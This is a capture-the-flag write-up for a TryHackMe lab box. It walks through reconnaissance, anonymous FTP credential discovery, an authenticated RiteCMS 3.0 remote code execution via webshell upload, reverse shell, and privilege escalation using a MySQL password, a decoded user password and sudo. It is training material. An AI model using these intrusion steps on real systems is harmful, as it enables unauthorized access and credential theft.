# Boot2Root - 2 [18 solves] [471 points]

### Description
```
Fire the instance and start hacking
Instance - 1: https://tryhackme.com/jr/bsmumbaictflink2 
Instance - 2: https://tryhackme.com/jr/bsmumbaictftest
Note : Brute forcing is not required.
```

### Nmap scan : 
```
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Dec 09 02:36 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.9.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ce:d7:41:06:24:3a:12:f6:33:6c:76:a2:22:7a:07:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEZVuKENvQOCIy02mxa10IrInPqmQ6B6ANQWxjtF/AjkxTqYYQeb+6sBivOT3gHRot2FBoCNuN9bPU4Za9giBMsFIa5HBEftUVWfq+mloMA3dynxvl21QvDZXbhavpehAgV7uteQpZkrkFrV7qEFtoy1NbvQPbveQQDYS+EMgEtXW9qtRY0QC2Xpvh0S2HK1UUk9VVYgUETngs3d+TWcV3EtW9Ib0ai3QIhhB1/0yblD5QADz+3zTJQZkOsCwEtyQcUyEskI+NXcOOWHUXN+RwosLiyrTWkeD4521gyTPjXcGhdCagsWbX1TrbYPGNneVhVW5NJoOJHkPC8zbtjbDf
|   256 65:00:38:bb:49:13:6b:90:52:4b:be:e3:50:01:43:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA0FuAuqUMqUYFp6eSMUEjwuvtDwGPG6F/r72EIca8ikmn+o3Nu9Lmi/cI+DCs6VSv1vU97cFd2JeGkrnQmJuMQ=
|   256 0a:e0:b4:89:44:d3:d4:d0:43:b3:22:f2:12:84:e5:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFxW98Ac6Eru3eN2DvFRS8hL7QttddKnHt1vgbj6JhoR
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: The Snake - bob
3306/tcp  open  mysql   syn-ack ttl 61 MySQL 5.7.33-0ubuntu0.16.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.16.04.1
|   Thread ID: 22
|   Capabilities flags: 65535
|   Some Capabilities: SupportsCompression, Support41Auth, FoundRows, SupportsTransactions, Speaks41ProtocolOld, ConnectWithDatabase, LongPassword, SwitchToSSLAfterHandshake, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x10n9MJ^K"4|I\x1F\x06\x7F|\x10R\x06p\x16
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.33_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-09T05:20:44
| Not valid after:  2032-12-06T05:20:44
| MD5:   1af4 2532 2525 7dc7 e1af d72b 12e2 f133
| SHA-1: 0fbb a8c9 82a6 b6a9 122e 28e6 f76e 524f fde6 60b2
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMzX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIyMTIwOTA1MjA0NFoXDTMyMTIwNjA1MjA0NFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zM19BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQD1CaV9w2PMIKbzZNwM3Fl5
| lOUsGoayWqQ/kruookjmz1Ei3Z2/twkJL9lrpfStSZztZDM1ZS5UbY5S8iZsB4x5
| vAH5dzRHepZlU/ne0d02cKAZuEBGifUpPv8feHbBGv1RHA3XlJGpVxcZuspaJUxS
| bV9sNw6vFpjkcZbmShBgWgxQ9oiOwLE25fv9gxv22qYADzfZIyhux6+OP76+uBt6
| soLJK7cJJOtbWl1TocrobVNraUQywxhOo8+kpm1R8r59JlOYnE7I5gSW/gXYG3ZE
| iK4za24k5IT3kes5KpFrGyMCEybxMVBEnZNoQYmpTHS/ihozb6rs8O7WJ3p8b66n
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAFdadNiw
| fDKORaOQ7I5oYFTJA/1reueXttRFrdpqSa2bGTO2RWYpvjGtpHxBieIKkKfNpeLK
| JC94FA3p3VTwMW+xhDBoMxB7NOusVtiaLoea7/jdS9GU1z3zJrWTbM2vXGqMqTka
| xXh4rCIShptak94mlf+AB/Pws54uoByxOZ33lZRqfUejEJcuHMeZWRHMrhY3taMt
| zGJ9OF+z7IlaFcqbxBHxLDcFTKKo0OUz04/EAS1t2vfCIv0hp3pt6j+LAtbTDw4e
| Hw2UDOoyaB+MDjD4ExDEG+C/Lt416DLiRGbue6wOMrx9tlkr7L1779i2HdVDBSDd
| A/+LWcSgqY6XGVY=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
13389/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 119F4CF3FF76FB929F4CE4A068CA8FBB
|_http-generator: RiteCMS 3.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: RiteCMS 3.0 demo - home
```

### Foothold : 

The FTP server has a `.secret`
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Dec 09 02:39 .
drwxr-xr-x    4 0        0            4096 Dec 09 02:39 ..
drwxr-xr-x    2 0        0            4096 Dec 09 02:39 .secret
drwxr-xr-x    2 65534    65534        4096 Dec 09 02:36 pub
```

There's a `.creds` file inside :
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Dec 09 02:39 .
drwxr-xr-x    4 0        0            4096 Dec 09 02:39 ..
-rw-r--r--    1 0        0              43 Dec 09 02:39 .creds
226 Directory send OK.
ftp> get .creds
``` 

It contains some creds :
```
# cat .creds 
administrator:P@$$w0rd_3l1t3


Good Luck!!
```

Port 13389 is a web server running RiteCMS 3.0 which is vulnerable to an authenticated RCE :
https://www.exploit-db.com/exploits/50616

Just login with the creds found in FTP and upload a PHP webshell to web root with directory traversal, where PHP file can be executed

Then just get a reverse shell for convenience

### Privesc : 

There's a `.sqlll.conff.bak` file :
```
(remote) www-data@box1:/var/www/html/gasgdjjkhkja$ ls -la
total 116
drwxrwxr-x 9 www-data www-data  4096 Dec 10 05:10 .
drwxr-xr-x 6 root     root      4096 Dec  8 22:38 ..
-rwxrwxr-x 1 www-data www-data 12292 Mar 10  2021 .DS_Store
-rwxrwxr-x 1 www-data www-data   318 Dec  9 01:30 .htaccess
-rw-r--r-- 1 www-data www-data    37 Dec  9 01:32 .sqlll.conff.bak
drwxrwxr-x 3 www-data www-data  4096 Dec  9 00:07 __MACOSX
-rwxrwxr-x 1 www-data www-data  3913 Mar  5  2021 admin.php
drwxrwxr-x 8 www-data www-data  4096 Mar  5  2021 cms
drwxrwxr-x 4 www-data www-data  4096 Dec 10 05:10 data
drwxrwxr-x 2 www-data www-data  4096 Dec 10 05:10 files
-rwxrwxr-x 1 www-data www-data  4143 Mar  3  2021 index.php
-rw-r--r-- 1 www-data www-data    39 Dec 10 05:10 index1.php
-rwxrwxr-x 1 www-data www-data 32472 Mar 18  2011 license_gpl_v3.txt
drwxrwxr-x 3 www-data www-data  4096 Dec  9 04:56 media
-rwxrwxr-x 1 www-data www-data  5735 Mar  7  2021 readme.md
drwxrwxr-x 2 www-data www-data  4096 Dec  9 00:08 ritedev
drwxrwxr-x 4 www-data www-data  4096 Mar  5  2021 templates
```

It contains creds for mysql :
```
(remote) www-data@box1:/var/www/html/gasgdjjkhkja$ cat .sqlll.conff.bak 
username=root
password=C@pt@1n_Gr007
```

Then just connect to mysql and there's a `quick` database which contains bob's password :
```
(remote) www-data@box1:/var/www/html/gasgdjjkhkja$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 30
Server version: 5.7.33-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quick              |
| sys                |
+--------------------+
5 rows in set (0.64 sec)

mysql> use quick
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+------+----------------------+
| user | password             |
+------+----------------------+
| bob  | QjBCXzdoM19idTFsZDNy |
+------+----------------------+
1 row in set (0.00 sec)

```

Then just base64 decode it :
```
# echo 'QjBCXzdoM19idTFsZDNy' | base64 -d
B0B_7h3_bu1ld3r
```

Then just switch to user bob with `su` with the password :
```
(remote) www-data@box1:/var/www/html/gasgdjjkhkja$ su bob
Password: 
bob@box1:/var/www/html/gasgdjjkhkja$ 
```

Bob is in the sudo group and he can run all command as root with sudo as long as we know the password :
```
bob@box1:~$ sudo -l
sudo: unable to resolve host box1
[sudo] password for bob: 
Matching Defaults entries for bob on box1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on box1:
    (ALL : ALL) ALL
```

Then just escalate to root and read the flag :
```
bob@box1:~$ sudo bash
sudo: unable to resolve host box1
root@box1:~# cd /root
root@box1:/root# ls
root_flag.txt
root@box1:/root# cat root_flag.txt
BSMumbai{807a0ceba11c237ccc954673cc2ca2d5}
```